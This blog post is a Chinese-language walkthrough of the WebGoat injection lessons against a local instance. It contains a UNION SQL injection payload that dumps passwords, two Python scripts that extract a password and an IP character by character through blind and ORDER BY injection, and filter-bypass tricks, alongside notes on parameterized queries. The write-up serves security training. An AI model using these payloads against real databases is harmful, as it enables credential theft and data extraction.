---
layout: post
title:  "WebGoat A3"
date:   2026-01-05 11:43 +0800
categories: blog update
tag: 网络安全
---

# Injection

## SQL Injection (intro)

示例界面：![简单SQL查询](/assets/images/260105-A3_1_1.png) ![简单SQL更新](/assets/images/260105-A3_1_2.png) ![简单SQL修改](/assets/images/260105-A3_1_3.png) ![SQL权限](/assets/images/260105-A3_1_4.png) ![SQL注入实例](/assets/images/260105-A3_1_5.png) ![还是1=1](/assets/images/260105-A3_1_6.png) ![还是还是1=1](/assets/images/260105-A3_1_7.png) ![SQL query chaining](/assets/images/260105-A3_1_8.png) ![drop table](/assets/images/260105-A3_1_9.png)

`;` 结束语句，`--` 注释剩余内容。源码示例展示字符串拼接导致可注入：![source code](/assets/images/260105-A3_1_10.png)

---

## SQL Injection (advanced)

两个表字段展示：![两个表](/assets/images/260105-A3_2_1.png)

UNION 需列对齐，例如：

```sql
SELECT * FROM user_data WHERE last_name = 'Dave'
UNION SELECT 1,'a',user_name,password,'a','a',1 FROM user_system_data--
```

Q5 界面：![Q5](/assets/images/260105-A3_2_2.png)

盲注：无直接结果，仅通过行为推断。

注册页测试：![register tom](/assets/images/260105-A3_2_3.png)

- 输入 `tom` 重复注册 + `1=1` 提示已存在；`1=2` 返回创建成功，证明布尔盲注可行：![测试重复注册并且1=1](/assets/images/260105-A3_2_4.png) ![测试1=2](/assets/images/260105-A3_2_5.png)
- 继续猜测字段与长度，确认存在 `password`，长度为 23：![password exist](/assets/images/260105-A3_2_6.png) ![length=23](/assets/images/260105-A3_2_7.png)

编写脚本枚举小写字母，逐位盲注爆破密码：

```python
import string
import requests

str_list = list(string.ascii_lowercase)
url = "http://127.0.0.1:9080/WebGoat/SqlInjectionAdvanced/register"
password = ""

for i in range(1, 24):
    for j in str_list:
        data = (
            f"username_reg=tom'+and+substring(password,{i},1)%3D'{j}'+'--&"
            "email_reg=1%401.com&password_reg=1&confirm_password_reg=1"
        )
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "JSESSIONID=1B03FBA8D22FE42FE2861021D269ECE9",
        }
        res = requests.put(url, data, headers=headers)
        if "already exists" in res.text:
            password += j
print(password)
print(len(password))
```

爆破结果与登录成功：![result](/assets/images/260105-A3_2_8.png) ![success](/assets/images/260105-A3_2_9.png)

源码使用字符串拼接执行，依据返回状态给出不同提示，必须盲注才能取数：![source code](/assets/images/260105-A3_2_10.png)

---

## SQL Injection (mitigation)

安全编写 SQL：使用参数化而非格式化拼接。

示例：![使用ps.set而不要使用format](/assets/images/260105-A3_3_1.png) ![参数化查询的示例](/assets/images/260105-A3_3_2.png)

单纯输入过滤不足：空格可被 `/**/` 代替，关键字可变形：![不能输入空格](/assets/images/260105-A3_3_4.png) ![使用/**/代替空格](/assets/images/260105-A3_3_3.png) ![关键字被过滤了](/assets/images/260105-A3_3_6.png) ![在关键字中间插入关键字，比如selselectect](/assets/images/260105-A3_3_5.png)

`ORDER BY` 注入：

- 语法允许 `orderExpression` 为 `selectExpression`，可用 `CASE` 询问布尔问题，如 `SELECT * FROM users ORDER BY (CASE WHEN (TRUE) THEN lastname ELSE firstname END)`。
- 需要对排序列做白名单（如 `lastname`、`firstname`）。

题目要求获取 `webgoat-prd` 的 IP。抓包看到查询：![column=ip](/assets/images/260105-A3_3_7.png)

将排序参数替换为 `(case when (1=1) id then id else ip end)--`，结果按 `id` 排序，证明可注入：![order by id](/assets/images/260105-A3_3_8.png)

构造基于 `CASE` 的盲注逐字符枚举 IP。表名可通过请求错误列观察错误信息得到 `SERVERS`（无错误时需爆破）。请求示例：![curl](/assets/images/260105-A3_3_9.png)

Python 脚本：

```python
import string
import json
import requests

chars = list("0123456789.")
url = "http://127.0.0.1:9080/WebGoat/SqlInjectionMitigations/servers?column="
ip = ""

for i in range(1, 16):
    for c in chars:
        payload = (
            f"(case+when+(substring((select+ip+from+servers+where+hostname='webgoat-prd'),{i},1)='{c}')+"
            "then+id+else+ip+end)--+"
        )
        res = requests.get(f"{url}{payload}", headers={"Cookie": "JSESSIONID=631CB1445583D221C571C86937C66D42"})
        if json.loads(res.text)[0]["id"] == "1":
            ip += c
            break
print(ip)
```

枚举结果：![ip](/assets/images/260105-A3_3_10.png)

提交答案正确：![正确](/assets/images/260105-A3_3_11.png)
